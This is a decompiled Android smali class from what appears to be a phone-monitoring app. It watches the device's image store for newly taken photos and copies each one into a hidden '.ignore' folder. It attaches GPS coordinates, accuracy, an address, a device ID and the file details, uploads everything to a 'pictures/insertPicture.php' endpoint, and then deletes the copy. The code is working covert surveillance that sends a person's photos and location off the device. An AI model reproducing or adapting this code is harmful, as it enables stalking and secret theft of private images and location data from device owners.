.class public final Ldp;
.super Ljava/lang/Object;
.source "Media.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field private static a:Ljava/lang/String; = ""


# instance fields
.field private final b:Landroid/content/Context;

.field private final c:Ljava/lang/String;

.field private d:Ljava/lang/String;

.field private e:Landroid/database/Cursor;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Ljava/lang/String;)V
    .locals 1

    .line 40
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const-string v0, ""

    .line 37
    iput-object v0, p0, Ldp;->d:Ljava/lang/String;

    .line 41
    iput-object p1, p0, Ldp;->b:Landroid/content/Context;

    .line 42
    iput-object p2, p0, Ldp;->c:Ljava/lang/String;

    return-void
.end method

.method private a()V
    .locals 7

    .line 200
    iget-object v0, p0, Ldp;->c:Ljava/lang/String;

    const-string v1, "INTERNAL"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 201
    iget-object v0, p0, Ldp;->b:Landroid/content/Context;

    .line 202
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/MediaStore$Images$Media;->INTERNAL_CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const-string v6, "date_added ASC"

    .line 203
    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    iput-object v0, p0, Ldp;->e:Landroid/database/Cursor;

    return-void

    .line 210
    :cond_0
    iget-object v0, p0, Ldp;->b:Landroid/content/Context;

    .line 211
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/MediaStore$Images$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const-string v6, "date_added ASC"

    .line 212
    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    iput-object v0, p0, Ldp;->e:Landroid/database/Cursor;

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 27

    move-object/from16 v1, p0

    const-wide/16 v2, 0xc8

    .line 49
    :try_start_0
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    goto/16 :goto_6

    :catch_1
    move-exception v0

    move-object v2, v0

    .line 51
    :try_start_1
    invoke-virtual {v2}, Ljava/lang/InterruptedException;->printStackTrace()V

    .line 54
    :goto_0
    invoke-direct/range {p0 .. p0}, Ldp;->a()V

    .line 56
    iget-object v0, v1, Ldp;->e:Landroid/database/Cursor;

    if-eqz v0, :cond_b

    .line 57
    iget-object v0, v1, Ldp;->e:Landroid/database/Cursor;

    invoke-interface {v0}, Landroid/database/Cursor;->moveToLast()Z

    move-result v0

    const-wide/16 v2, 0x1f4

    if-nez v0, :cond_0

    const-wide/16 v4, 0x12c

    .line 58
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    .line 59
    invoke-direct/range {p0 .. p0}, Ldp;->a()V

    .line 61
    iget-object v0, v1, Ldp;->e:Landroid/database/Cursor;

    invoke-interface {v0}, Landroid/database/Cursor;->moveToLast()Z

    move-result v0

    if-nez v0, :cond_a

    .line 62
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    .line 63
    invoke-direct/range {p0 .. p0}, Ldp;->a()V

    .line 65
    iget-object v0, v1, Ldp;->e:Landroid/database/Cursor;

    invoke-interface {v0}, Landroid/database/Cursor;->moveToLast()Z

    move-result v0

    if-nez v0, :cond_a

    .line 66
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 67
    invoke-direct/range {p0 .. p0}, Ldp;->a()V

    goto/16 :goto_5

    .line 1084
    :cond_0
    iget-object v0, v1, Ldp;->e:Landroid/database/Cursor;

    iget-object v4, v1, Ldp;->e:Landroid/database/Cursor;

    const-string v5, "date_added"

    invoke-interface {v4, v5}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v4

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v0

    .line 1086
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v4

    .line 1087
    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    invoke-virtual {v4, v5, v6}, Ljava/util/Calendar;->setTimeInMillis(J)V

    .line 1088
    invoke-virtual {v4}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v5

    const-wide/16 v7, 0x3e8

    mul-long v5, v5, v7

    .line 1089
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v7

    .line 1090
    invoke-virtual {v7}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v7

    sub-long/2addr v7, v5

    const-wide/32 v9, 0x186a0

    cmp-long v11, v7, v9

    if-gez v11, :cond_a

    .line 1094
    iget-object v7, v1, Ldp;->e:Landroid/database/Cursor;

    iget-object v8, v1, Ldp;->e:Landroid/database/Cursor;

    const-string v9, "_display_name"

    invoke-interface {v8, v9}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v7, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    if-nez v7, :cond_1

    const-wide/16 v7, 0xfa

    .line 1097
    invoke-static {v7, v8}, Ljava/lang/Thread;->sleep(J)V

    .line 1098
    invoke-direct/range {p0 .. p0}, Ldp;->a()V

    .line 1100
    iget-object v7, v1, Ldp;->e:Landroid/database/Cursor;

    iget-object v8, v1, Ldp;->e:Landroid/database/Cursor;

    const-string v9, "_display_name"

    invoke-interface {v8, v9}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v7, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 1103
    :cond_1
    iget-object v8, v1, Ldp;->e:Landroid/database/Cursor;

    iget-object v9, v1, Ldp;->e:Landroid/database/Cursor;

    const-string v10, "_size"

    invoke-interface {v9, v10}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v9

    invoke-interface {v8, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 1104
    iget-object v9, v1, Ldp;->e:Landroid/database/Cursor;

    iget-object v10, v1, Ldp;->e:Landroid/database/Cursor;

    const-string v11, "_data"

    invoke-interface {v10, v11}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v10

    invoke-interface {v9, v10}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 1106
    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v11, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ler;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " "

    invoke-virtual {v10, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, v1, Ldp;->d:Ljava/lang/String;

    .line 1108
    sget-object v0, Ldp;->a:Ljava/lang/String;

    iget-object v10, v1, Ldp;->d:Ljava/lang/String;

    invoke-virtual {v0, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_a

    .line 1110
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v10, Ldp;->a:Ljava/lang/String;

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v10, v1, Ldp;->d:Ljava/lang/String;

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 1112
    sput-object v0, Ldp;->a:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    const/16 v10, 0x2710

    if-le v0, v10, :cond_2

    const-string v0, ""

    .line 1113
    sput-object v0, Ldp;->a:Ljava/lang/String;

    .line 1116
    :cond_2
    invoke-static {}, Ler;->e()Ljava/text/SimpleDateFormat;

    move-result-object v0

    .line 1117
    invoke-virtual {v4, v5, v6}, Ljava/util/Calendar;->setTimeInMillis(J)V

    .line 1118
    invoke-virtual {v4}, Ljava/util/Calendar;->getTime()Ljava/util/Date;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v4

    .line 1120
    new-instance v5, Landroid/content/ContextWrapper;

    iget-object v6, v1, Ldp;->b:Landroid/content/Context;

    invoke-direct {v5, v6}, Landroid/content/ContextWrapper;-><init>(Landroid/content/Context;)V

    .line 1121
    new-instance v6, Ljava/io/File;

    invoke-virtual {v5}, Landroid/content/ContextWrapper;->getFilesDir()Ljava/io/File;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v5

    const-string v10, ".ignore"

    invoke-direct {v6, v5, v10}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 1122
    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v5

    if-nez v5, :cond_3

    .line 1123
    invoke-virtual {v6}, Ljava/io/File;->mkdirs()Z

    .line 1126
    :cond_3
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v10, "/Picture_"

    invoke-direct {v5, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v10, v1, Ldp;->b:Landroid/content/Context;

    invoke-static {v10}, Lda;->f(Landroid/content/Context;)I

    move-result v10

    invoke-virtual {v5, v10}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v10

    invoke-virtual {v5, v10, v11}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v10, ".jpg"

    invoke-virtual {v5, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    if-eqz v7, :cond_4

    .line 1129
    invoke-static {v7}, Landroid/webkit/MimeTypeMap;->getFileExtensionFromUrl(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    if-eqz v10, :cond_5

    const-string v11, ""

    .line 1131
    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_5

    .line 1132
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v11, "/Picture_"

    invoke-direct {v5, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v11, v1, Ldp;->b:Landroid/content/Context;

    invoke-static {v11}, Lda;->f(Landroid/content/Context;)I

    move-result v11

    invoke-virtual {v5, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v11

    invoke-virtual {v5, v11, v12}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v11, "."

    invoke-virtual {v5, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    goto :goto_1

    .line 1135
    :cond_4
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v10, "Picture_"

    invoke-direct {v7, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v10

    invoke-virtual {v7, v10, v11}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v10, ".jpg"

    invoke-virtual {v7, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 1138
    :cond_5
    :goto_1
    new-instance v15, Ljava/io/File;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v15, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1139
    new-instance v6, Ljava/io/File;

    invoke-direct {v6, v9}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    const/4 v9, 0x0

    :goto_2
    const/4 v10, 0x6

    if-ge v9, v10, :cond_7

    .line 1142
    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v10

    if-nez v10, :cond_6

    .line 1143
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    :cond_6
    add-int/lit8 v9, v9, 0x1

    goto :goto_2

    .line 1148
    :cond_7
    invoke-static {v6, v15}, Leq;->a(Ljava/io/File;Ljava/io/File;)V

    .line 1151
    invoke-static {}, Lcom/app/received/LocationReceived;->a()Landroid/location/Location;

    move-result-object v2

    const-wide/16 v11, 0x0

    if-eqz v2, :cond_8

    .line 1158
    invoke-virtual {v2}, Landroid/location/Location;->getLongitude()D

    move-result-wide v11

    .line 1159
    invoke-virtual {v2}, Landroid/location/Location;->getLatitude()D

    move-result-wide v13

    .line 1160
    invoke-virtual {v2}, Landroid/location/Location;->getAccuracy()F

    move-result v3

    float-to-double v9, v3

    .line 1161
    invoke-virtual {v2}, Landroid/location/Location;->getTime()J

    move-result-wide v2

    move-wide/from16 v25, v11

    move-wide v11, v13

    move-wide/from16 v13, v25

    goto :goto_3

    :cond_8
    move-wide v9, v11

    move-wide v13, v9

    const-wide/16 v2, 0x0

    .line 1164
    :goto_3
    iget-object v6, v1, Ldp;->b:Landroid/content/Context;

    invoke-static {v6}, Lcom/app/received/LocationReceived;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    const-wide/16 v16, 0x0

    cmp-long v18, v2, v16

    if-eqz v18, :cond_9

    .line 1167
    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/text/SimpleDateFormat;->format(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 1168
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "###DATELOC###"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_4

    :cond_9
    move-object v0, v6

    .line 1171
    :goto_4
    invoke-virtual {v15}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v13, v14}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v11, v12}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v16

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v9, v10}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    iget-object v6, v1, Ldp;->b:Landroid/content/Context;

    move-wide/from16 v19, v9

    move-object v10, v7

    move-wide/from16 v21, v11

    move-object v11, v2

    move-object v12, v8

    move-wide/from16 v23, v13

    move-object v13, v4

    move-object v14, v0

    move-object v2, v15

    move-object v15, v3

    move-object/from16 v18, v6

    invoke-static/range {v10 .. v18}, Lu;->b(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)J

    move-result-wide v9

    .line 1175
    new-instance v3, Ljava/util/HashMap;

    invoke-direct {v3}, Ljava/util/HashMap;-><init>()V

    const-string v6, "idPhone"

    .line 1176
    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v12, v1, Ldp;->b:Landroid/content/Context;

    invoke-static {v12}, Lda;->f(Landroid/content/Context;)I

    move-result v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v11

    invoke-virtual {v3, v6, v11}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "name"

    .line 1177
    invoke-static {v7}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v7

    invoke-virtual {v3, v6, v7}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v6, "pathFile"

    .line 1178
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v11, v1, Ldp;->b:Landroid/content/Context;

    invoke-static {v11}, Lda;->f(Landroid/content/Context;)I

    move-result v11

    invoke-virtual {v7, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v11, "/"

    invoke-virtual {v7, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v5

    invoke-virtual {v3, v6, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v5, "size"

    .line 1179
    invoke-static {v8}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v6

    invoke-virtual {v3, v5, v6}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v5, "date"

    .line 1180
    invoke-static {v4}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v4

    invoke-virtual {v3, v5, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v4, "address"

    .line 1181
    invoke-static {v0}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v0

    invoke-virtual {v3, v4, v0}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "longitude"

    .line 1182
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    move-wide/from16 v11, v23

    invoke-virtual {v4, v11, v12}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v4

    invoke-virtual {v3, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "latitude"

    .line 1183
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    move-wide/from16 v11, v21

    invoke-virtual {v4, v11, v12}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v4

    invoke-virtual {v3, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "accuracy"

    .line 1184
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    move-wide/from16 v11, v19

    invoke-virtual {v4, v11, v12}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ldh;->a(Ljava/lang/String;)Lare;

    move-result-object v4

    invoke-virtual {v3, v0, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v0, "multipart/form-data"

    .line 1187
    invoke-static {v0}, Laqy;->b(Ljava/lang/String;)Laqy;

    move-result-object v0

    invoke-static {v0, v2}, Lare;->create(Laqy;Ljava/io/File;)Lare;

    move-result-object v0

    const-string v4, "uploadedfile"

    .line 1188
    invoke-virtual {v2}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5, v0}, Laqz$b;->a(Ljava/lang/String;Ljava/lang/String;Lare;)Laqz$b;

    move-result-object v0

    const-string v4, "pictures/insertPicture.php"

    .line 1190
    invoke-static {v4, v3, v0}, Lcv;->a(Ljava/lang/String;Ljava/util/HashMap;Laqz$b;)Z

    move-result v0

    if-eqz v0, :cond_a

    long-to-int v0, v9

    .line 1191
    iget-object v3, v1, Ldp;->b:Landroid/content/Context;

    invoke-static {v0, v3}, Lu;->k(ILandroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_a

    .line 1192
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    .line 74
    :cond_a
    :goto_5
    iget-object v0, v1, Ldp;->e:Landroid/database/Cursor;

    invoke-interface {v0}, Landroid/database/Cursor;->close()V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_7

    .line 77
    :goto_6
    invoke-virtual {v0}, Ljava/lang/Throwable;->getStackTrace()[Ljava/lang/StackTraceElement;

    .line 1223
    :cond_b
    :goto_7
    :try_start_2
    invoke-static {}, Lcom/app/service/UploadDataService;->a()V

    .line 1225
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "UploadDataService.getmNbTask() : "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/app/service/UploadDataService;->b()I

    move-result v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 1227
    invoke-static {}, Lcom/app/service/UploadDataService;->b()I

    move-result v0

    if-gtz v0, :cond_c

    .line 1228
    iget-object v0, v1, Ldp;->b:Landroid/content/Context;

    new-instance v2, Landroid/content/Intent;

    iget-object v3, v1, Ldp;->b:Landroid/content/Context;

    const-class v4, Lcom/app/service/UploadDataService;

    invoke-direct {v2, v3, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v2}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_2

    :cond_c
    return-void

    :catch_2
    move-exception v0

    .line 1231
    invoke-static {v0}, Lcom/crashlytics/android/Crashlytics;->logException(Ljava/lang/Throwable;)V

    return-void
.end method
